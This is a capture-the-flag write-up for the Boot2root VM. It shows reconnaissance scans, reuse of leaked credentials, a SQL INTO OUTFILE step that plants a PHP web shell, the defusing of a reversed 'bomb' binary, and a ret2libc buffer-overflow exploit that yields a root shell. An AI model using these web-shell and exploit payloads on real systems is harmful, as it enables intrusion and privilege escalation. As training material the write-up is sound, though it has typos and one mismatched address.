# Method 1

## FIND VMs ID

Let's configure 'virtual host adapter (192.168.56.1/24)' network to our VM and find it's IP.

```bash
MacBook-Pro-admin:~ avdementev$ nmap 192.168.56.1-255
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-09 00:09 MSK
Nmap scan report for 192.168.56.1
Host is up (0.00010s latency).
Not shown: 995 closed ports
PORT     STATE SERVICE
111/tcp  open  rpcbind
999/tcp  open  garcon
1021/tcp open  exp1
1023/tcp open  netvenuechat
2049/tcp open  nfs

Nmap scan report for 192.168.56.100
Host is up (0.00038s latency).
All 1000 scanned ports on 192.168.56.100 are closed

Nmap scan report for 192.168.56.101
Host is up (0.00068s latency).
Not shown: 994 filtered ports
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
143/tcp open  imap
443/tcp open  https
993/tcp open  imaps

Nmap done: 255 IP addresses (3 hosts up) scanned in 81.90 seconds
```

The result IP will be like 192.168.56.x (In this case - 192.168.56.100)

## Scan 80 and 443
Let's open http://192.168.56.100
![](https://github.com/demsasha4yt/Boot2root/blob/master/screens/1.png)
We will use penteesting tools like Burp Suite or dirb.
```bash
┌──(dubr㉿kali)-[~]
└─$ dirb http://192.168.56.106 -r                                                    255 ⨯
 
-----------------
DIRB v2.22
By The Dark Raver
-----------------
 
START_TIME: Sat Jan  9 15:59:16 2021
URL_BASE: http://192.168.56.106/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
OPTION: Not Recursive
 
-----------------
 
GENERATED WORDS: 4612
 
---- Scanning URL: http://192.168.56.106/ ----
+ http://192.168.56.106/cgi-bin/ (CODE:403|SIZE:290)
==> DIRECTORY: http://192.168.56.106/fonts/
+ http://192.168.56.106/forum (CODE:403|SIZE:287)
+ http://192.168.56.106/index.html (CODE:200|SIZE:1025)
+ http://192.168.56.106/server-status (CODE:403|SIZE:295)
 
-----------------
END_TIME: Sat Jan  9 15:59:18 2021
DOWNLOADED: 4612 - FOUND: 4
 
 
 
┌──(dubr㉿kali)-[~]
└─$ dirb https://192.168.56.106 -r                                                   130 ⨯
 
-----------------
DIRB v2.22
By The Dark Raver
-----------------
 
START_TIME: Sat Jan  9 16:00:01 2021
URL_BASE: https://192.168.56.106/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
OPTION: Not Recursive
 
-----------------
 
GENERATED WORDS: 4612
 
---- Scanning URL: https://192.168.56.106/ ----
+ https://192.168.56.106/cgi-bin/ (CODE:403|SIZE:291)
==> DIRECTORY: https://192.168.56.106/forum/
==> DIRECTORY: https://192.168.56.106/phpmyadmin/
+ https://192.168.56.106/server-status (CODE:403|SIZE:296)
==> DIRECTORY: https://192.168.56.106/webmail/
 
-----------------
END_TIME: Sat Jan  9 16:00:03 2021
DOWNLOADED: 4612 - FOUND: 2
```

## FORUM - Probleme login ?

```
....
....
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Received disconnect from 161.202.39.38: 3: com.jcraft.jsch.JSchException: Auth fail [preauth]
Oct 5 08:46:01 BornToSecHackMe CRON[7549]: pam_unix(cron:session): session opened for user lmezard by (uid=1040)
```
!q\]Ej?*5K5cy*AJ - PASSWORD???
After some tries we got password for lmezards forum account
```
lmezard:!q\]Ej?*5K5cy*AJ
```
![](https://github.com/demsasha4yt/Boot2root/blob/master/screens/2.png)

Lmezards mail is laurie@borntosec.net
Let's try to access to 192.168.56.x/forum with the same password

```
laurie@borntosec.net:!q\]Ej?*5K5cy*AJ
```


There is the message DB Access:

```
Hey Laurie,

You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$

Best regards.
```

Now we can to access 192.168.56.x/phpmyadmin
![](https://github.com/demsasha4yt/Boot2root/blob/master/screens/4.png)

## Reverse Shell

The basic reverse shell injection looks litke this

```sql
SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/backdoor.php"
```
It does not work becouse permission denied.

But it works:
```sql
SELECT "<?php system($_GET['cmd']); ?>" into outfile '/var/www/forum/templates_c/backdoor.php'
```

Now we can use this php like shell.

https://192.168.56.101/forum/templates_c/backdoor.php?cmd=ls%20/home
```
LOOKATME ft_root laurie laurie@borntosec.net lmezard thor zaz
```

https://192.168.56.101/forum/templates_c/backdoor.php?cmd=ls%20/home/LOOKATAME
```
password
```

https://192.168.56.101/forum/templates_c/backdoor.php?cmd=cat%20/home/LOOKATME/password
```
lmezard:G!@M6f4Eatau{sF"
```

And now we can to pass this data to ssh or ftp.
FTP is ok.
![](https://github.com/demsasha4yt/Boot2root/blob/master/screens/5.png)

## Sort files (Lmezerd)

There are two files fun and README.md
```
MacBook-Pro-admin:lmezard avdementev$ cat README 
Complete this little challenge and use the result as password for user 'laurie' to login in ssh

MacBook-Pro-admin:lmezard avdementev$ file fun
fun: POSIX tar archive (GNU)
MacBook-Pro-admin:lmezard avdementev$ tar xvf fun
x ft_fun/
x ft_fun/C4D03.pcap
x ft_fun/GKGEP.pcap
..
x ft_fun/Y8S1M.pcap
MacBook-Pro-admin:lmezard avdementev$ ls -l ft_fun/ | wc -l
     751
MacBook-Pro-admin:lmezard avdementev$ 
```

There are 751 file with pieces of code... The solve program in lmezard folder.

We got password:
```
Iheartpwnage
sha256(Iheartpwnage) = 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
```

Let's connect to SSH:
```
laurie:330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
```

## Reverse program (laurie)

```
laurie@192.168.56.101's password:
laurie@BornToSecHackMe:~$ ls
bomb  README
laurie@BornToSecHackMe:~$ cat README
Diffuse this bomb!
When you have all the password use it as "thor" user with ssh.

HINT:
P
 2
 b

o
4

NO SPACE IN THE PASSWORD (password is case sensitive).
```

Lets download bomb file and open it in IDA.

```
MacBook-Pro-admin:Boot2root avdementev$ scp laurie@192.168.56.101:/home/laurie/bomb ./laurie
        ____                _______    _____           
       |  _ \              |__   __|  / ____|          
       | |_) | ___  _ __ _ __ | | ___| (___   ___  ___ 
       |  _ < / _ \| '__| '_ \| |/ _ \\___ \ / _ \/ __|
       | |_) | (_) | |  | | | | | (_) |___) |  __/ (__ 
       |____/ \___/|_|  |_| |_|_|\___/_____/ \___|\___|

                       Good luck & Have fun
laurie@192.168.56.101's password: 
bomb                                                                                                                                  100%   26KB  18.4MB/s   00:00  
```

```c
undefined4 main(char **argv, char **envp)
{
    int32_t iVar1;
    char *s;
    int32_t var_18h;
    
    if (argv == (char **)0x1) {
        _infile = _reloc.stdin;
    } else {
        if (argv != (char **)0x2) {
            printf("Usage: %s [<input_file>]\n", *envp);
    // WARNING: Subroutine does not return
            exit(8);
        }
        _infile = fopen(envp[1], 0x8049620);
        if (_infile == 0) {
            printf("%s: Error: Couldn\'t open %s\n", *envp, envp[1]);
    // WARNING: Subroutine does not return
            exit(8);
        }
    }
    initialize_bomb();
    printf("Welcome this is my little bomb !!!! You have 6 stages with\n");
    printf("only one life good luck !! Have a nice day!\n");
    iVar1 = read_line();
    gcc2_compiled.(iVar1);
    phase_defused();
    printf("Phase 1 defused. How about the next one?\n");
    iVar1 = read_line();
    phase_2(iVar1);
    phase_defused();
    printf("That\'s number 2.  Keep going!\n");
    iVar1 = read_line();
    phase_3(iVar1);
    phase_defused();
    printf("Halfway there!\n");
    s = (char *)read_line();
    phase_4(s);
    phase_defused();
    printf("So you got that one.  Try this one.\n");
    iVar1 = read_line();
    phase_5(iVar1);
    phase_defused();
    printf("Good work!  On to the next...\n");
    iVar1 = read_line();
    phase_6(iVar1);
    phase_defused();
    return 0;
}
```

### Phase1

```c
void gcc2_compiled.(int32_t arg_8h)
{
    int32_t iVar1;
    
    iVar1 = strings_not_equal(arg_8h, (int32_t)"Public speaking is very easy.");
    if (iVar1 != 0) {
    // WARNING: Subroutine does not return
        explode_bomb();
    }
    return;
}
```
The first arg should be equal string "Public speaking is very easy.". 

### Phase2
```c
void phase_2(int32_t arg_8h)
{
    int32_t iVar1;
    int32_t var_28h;
    int32_t iStack32;
    uint32_t var_18h;
    int32_t aiStack24 [5];
    
    read_six_numbers(arg_8h, (int32_t)&var_18h);
    if (var_18h != 1) {
    // WARNING: Subroutine does not return
        explode_bomb();
    }
    iVar1 = 1;
    do {
        if (aiStack24[iVar1 + -1] != (iVar1 + 1) * (&iStack32)[iVar1]) {
    // WARNING: Subroutine does not return
            explode_bomb();
        }
        iVar1 = iVar1 + 1;
    } while (iVar1 < 6);
    return;
}
```

Function recieves 6 number. The firts number shoulbe 1. And each next should be counted by (now = prev * now_index)

```python
numbers = []
numbers.append(1)
for i in range(1, 6):
    numbers.append(numbers[i - 1] * (i + 1))
print(numbers)
```

The key is [1, 2, 6, 24, 120, 720]


### Phase3
```c

// WARNING: Variable defined which should be unmapped: var_18h
// WARNING: [r2ghidra] Detected overlap for variable var_5h

void phase_3(int32_t arg_8h)
{
    int32_t iVar1;
    char cVar2;
    int32_t var_18h;
    uint32_t var_ch;
    char var_5h;
    uint32_t var_4h;
    
    iVar1 = sscanf(arg_8h, "%d %c %d", &var_ch, &var_5h, &var_4h);
    if (iVar1 < 3) {
    // WARNING: Subroutine does not return
        explode_bomb();
    }
    // switch table (8 cases) at 0x80497e8
    switch(var_ch) {
    case 0:
        cVar2 = 'q';
        if (var_4h != 0x309) {
    // WARNING: Subroutine does not return
            explode_bomb();
        }
        break;
    case 1:
        cVar2 = 'b';
        if (var_4h != 0xd6) {
    // WARNING: Subroutine does not return
            explode_bomb();
        }
        break;
    case 2:
        cVar2 = 'b';
        if (var_4h != 0x2f3) {
    // WARNING: Subroutine does not return
            explode_bomb();
        }
        break;
    case 3:
        cVar2 = 'k';
        if (var_4h != 0xfb) {
    // WARNING: Subroutine does not return
            explode_bomb();
        }
        break;
    case 4:
        cVar2 = 'o';
        if (var_4h != 0xa0) {
    // WARNING: Subroutine does not return
            explode_bomb();
        }
        break;
    case 5:
        cVar2 = 't';
        if (var_4h != 0x1ca) {
    // WARNING: Subroutine does not return
            explode_bomb();
        }
        break;
    case 6:
        cVar2 = 'v';
        if (var_4h != 0x30c) {
    // WARNING: Subroutine does not return
            explode_bomb();
        }
        break;
    case 7:
        cVar2 = 'b';
        if (var_4h != 0x20c) {
    // WARNING: Subroutine does not return
            explode_bomb();
        }
        break;
    default:
    // WARNING: Subroutine does not return
        explode_bomb();
    }
    if (cVar2 == var_5h) {
        return;
    }
    // WARNING: Subroutine does not return
    explode_bomb();
}
```

There is switch with different cases. The function recieves %d %c %d

Possible results:
* 0 q 777
* 1 b 214
* 2 b 755
* ...
* 7 b 514


### Phase4
```c

int32_t func4(int32_t arg_8h)
{
    int32_t iVar1;
    int32_t iVar2;
    int32_t var_18h;
    
    if (arg_8h < 2) {
        iVar2 = 1;
    } else {
        iVar1 = func4(arg_8h + -1);
        iVar2 = func4(arg_8h + -2);
        iVar2 = iVar2 + iVar1;
    }
    return iVar2;
}


void phase_4(char *s)
{
    int32_t iVar1;
    int32_t var_4h;
    
    iVar1 = sscanf(s, 0x8049808, &var_4h);
    if ((iVar1 == 1) && (0 < var_4h)) {
        iVar1 = func4(var_4h);
        if (iVar1 != 0x37) {
    // WARNING: Subroutine does not return
            explode_bomb();
        }
        return;
    }
    // WARNING: Subroutine does not return
    explode_bomb();
}

```

Simple recursive function.. The solve in phase4_solve.py

### Phase5

```c
void phase_5(int32_t arg_8h)
{
    int32_t iVar1;
    int32_t var_18h;
    int32_t var_8h;
    int32_t var_2h;
    
    iVar1 = string_length(arg_8h);
    if (iVar1 != 6) {
    // WARNING: Subroutine does not return
        explode_bomb();
    }
    iVar1 = 0;
    do {
        *(char *)((int32_t)&var_8h + iVar1) = str.isrveawhobpnutfg[(char)(*(uint8_t *)(iVar1 + arg_8h) & 0xf)];
        iVar1 = iVar1 + 1;
    } while (iVar1 < 6);
    var_2h._0_1_ = 0;
    iVar1 = strings_not_equal((int32_t)&var_8h, (int32_t)"giants");
    if (iVar1 != 0) {
    // WARNING: Subroutine does not return
        explode_bomb();
    }
    return;
}
```

The function recieves string with length 6 and each its symbol count i & 0xF
The result shoul be giants
Script phase5_solve.py solves this

The password is opukmq

### Phase6
```c
void phase_6(int32_t arg_8h)
{
    code *pcVar1;
    int32_t iVar2;
    code *pcVar3;
    int32_t iVar4;
    int32_t var_58h;
    int32_t var_3ch;
    int32_t var_38h;
    int32_t var_34h;
    int32_t var_30h;
    code *apcStack48 [5];
    int32_t var_18h;
    int32_t aiStack24 [5];
    
    read_six_numbers(arg_8h, (int32_t)&var_18h);
    iVar4 = 0;
    do {
        if (5 < aiStack24[iVar4 + -1] - 1U) {
    // WARNING: Subroutine does not return
            explode_bomb();
        }
        iVar2 = iVar4 + 1;
        if (iVar2 < 6) {
            do {
                if ((&var_18h)[iVar4] == (&var_18h)[iVar2]) {
    // WARNING: Subroutine does not return
                    explode_bomb();
                }
                iVar2 = iVar2 + 1;
            } while (iVar2 < 6);
        }
        iVar4 = iVar4 + 1;
    } while (iVar4 < 6);
    iVar4 = 0;
    do {
        pcVar3 = node1;
        iVar2 = 1;
        if (1 < (&var_18h)[iVar4]) {
            do {
                pcVar3 = *(code **)(pcVar3 + 8);
                iVar2 = iVar2 + 1;
            } while (iVar2 < (&var_18h)[iVar4]);
        }
        apcStack48[iVar4 + -1] = pcVar3;
        iVar4 = iVar4 + 1;
    } while (iVar4 < 6);
    iVar4 = 1;
    pcVar3 = (code *)var_30h;
    do {
        pcVar1 = apcStack48[iVar4 + -1];
        *(code **)(pcVar3 + 8) = pcVar1;
        iVar4 = iVar4 + 1;
        pcVar3 = pcVar1;
    } while (iVar4 < 6);
    *(undefined4 *)(pcVar1 + 8) = 0;
    iVar4 = 0;
    do {
        if (*(int32_t *)var_30h < **(int32_t **)(var_30h + 8)) {
    // WARNING: Subroutine does not return
            explode_bomb();
        }
        var_30h = *(int32_t *)(var_30h + 8);
        iVar4 = iVar4 + 1;
    } while (iVar4 < 5);
    return;
}
```

 The function recieves six numbers, sorts it and check that array[0] > array[1] > array[2] > array[3] > array[4] > array[5]
array[0] = node1
...
array[5] = node6
```bash
(gdb) p node1
$1 = 253
(gdb) p node2
$2 = 725
(gdb) p node3
$3 = 301
(gdb) p node4
$4 = 997
(gdb) p node5
$5 = 212
(gdb) p node6
$6 = 432
(gdb) p node7
```

 The resul pass is 4 2 6 3 1 5

The password for thor
 ```
Publicspeakingisveryeasy.126241207201b2149opekmq426135
```

## Turtle (Thor)

The basic list of turtles step
We'll use turtlejs to draw its way.
The password is SLASH

```bash
MBP-admin:Boot2root avdementev$ echo -n SLASH | md5
646da671ca01bb5d84dbb5fb2238dc8e
```

The result password is 646da671ca01bb5d84dbb5fb2238dc8e


### explot_me (Zaz)

We will use the ret2libc exploit to use root. All we net to do is SYSSEGV and use system("/bin/sh")

```bash
__libc_start_main(0x80483f4, 2, 0xbffff7c4, 0x8048440, 0x80484b0 <unfinished ...>
strcpy(0xbffff6a0, "sdafsdaf")                                    = 0xbffff6a0
puts("sdafsdaf"sdafsdaf
)                                                  = 9
+++ exited (status 0) +++
```

The programs prints first argument on screen using strcpy...

If we pass the string with length bigger then 140 the program will be crash with SYSSEGV
```
zaz@BornToSecHackMe:~$ echo $(python -c 'print "A"*140') > pattern
zaz@BornToSecHackMe:~$ ltrace ./exploit_me $(cat pattern)BB
__libc_start_main(0x80483f4, 2, 0xbffff744, 0x8048440, 0x80484b0 <unfinished ...>
strcpy(0xbffff620, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"...)                                        = 0xbffff620
puts("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"...AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABB
)                                                      = 143
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
```

Then we need to find address of system, /bin/sh/, exit...

```bash
zaz@BornToSecHackMe:~$ gdb ./exploit_me
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/zaz/exploit_me...(no debugging symbols found)...done.
(gdb) start
Temporary breakpoint 1 at 0x80483f7
Starting program: /home/zaz/exploit_me

Temporary breakpoint 1, 0x080483f7 in main ()
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
```

System address is 0x080483f7

```bash
(gdb) find '/bin/sh'
No symbol table is loaded.  Use the "file" command.
(gdb) info proc map
process 2953
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000        0x0 /home/zaz/exploit_me
	 0x8049000  0x804a000     0x1000        0x0 /home/zaz/exploit_me
	0xb7e2b000 0xb7e2c000     0x1000        0x0
	0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
	0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
	0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
	0xb7fd2000 0xb7fd5000     0x3000        0x0
	0xb7fdb000 0xb7fdd000     0x2000        0x0
	0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
	0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
	0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
	0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
	0xbffdf000 0xc0000000    0x21000        0x0 [stack]
(gdb) find 0xb7e2c000,0xb7fcf000,"/bin/sh"
0xb7f8cc58
1 pattern found.
```

The /bin/sh address is 0xb7f8cc58

```bash
(gdb) info function exit
All functions matching regular expression "exit":

Non-debugging symbols:
0xb7e5ebe0  exit
0xb7e5ec10  on_exit
0xb7e5ee20  __cxa_atexit
0xb7e5efc0  quick_exit
0xb7e5eff0  __cxa_at_quick_exit
0xb7ee41d8  _exit
0xb7f28500  pthread_exit
0xb7f2dc10  __cyg_profile_func_exit
0xb7f4c750  svc_exit
0xb7f56c80  atexit
```
exit address is 0xb7e5ebe0


The resul exploit string will be look this JUNK(140 bytes) + system in little endian + 4 bytes + /bin/sh (little endian)
```python
buf = ''
buf += 'A'*140 # junk
buf += '\x60\xb0\xe6\xb7' # system 0xb7e6b060
buf += "llll" # 4 bytes
buf += '\x58\xcc\xf8\xb7' # /bin/sh 0xb7f8cc58

f = open("exploit.txt", "w")
f.write(buf)
f.close
```

```
zaz@BornToSecHackMe:~$ ./exploit_me $(python exploit.py)
zaz@BornToSecHackMe:~$ ./exploit_me $(python exploit.py)
zaz@BornToSecHackMe:~$ ./exploit_me $(cat exploit.
exploit.py   exploit.txt
zaz@BornToSecHackMe:~$ ./exploit_me $(cat exploit.txt)
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`��llllX��
# whoami
root
```
# Done
